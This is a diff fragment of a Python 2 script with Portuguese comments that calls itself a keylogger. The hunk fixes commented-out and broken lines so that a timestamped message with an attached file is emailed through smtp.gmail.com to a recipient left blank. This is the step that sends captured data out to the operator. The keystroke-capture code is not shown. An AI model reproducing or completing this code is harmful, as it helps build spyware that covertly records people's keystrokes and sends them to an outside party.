@@ -60,15 +60,13 @@ def envia_email(servidor, porta, FROM, PASS, TO, subject, texto, anexo=[""]):
   except Exception,e:
     errorMsg = "Nao Foi Possivel Enviar o Email.\n Error: %s" % str(e)
     print('%s'%errorMsg)
-#
-d#ata_hora = datetime.datetime.now()
-d#ata_hora = str(data_hora).split('.')[0].replace(' ','_')###
-#
-#destinatario = '' #para onde você ira enviar o arquivo
-#assunto = 'Keylogger teste %s' %data_hora
-mensagem = 'teste do meu Keylogger 
 
-%s'%data_hora #mensagem é também pega a data é a hora do pc 
+data_hora = datetime.datetime.now()
+data_hora = str(data_hora).split('.')[0].replace(' ','_')###
+
+destinatario = '' #para onde você ira enviar o arquivo
+assunto = 'Keylogger teste %s' %data_hora
+mensagem = 'teste do meu Keylogger %s '%data_hora #mensagem é também pega a data é a hora do pc 
 
 servidor= 'smtp.gmail.com' #o servidor pode ser do gmail dentre outros
 
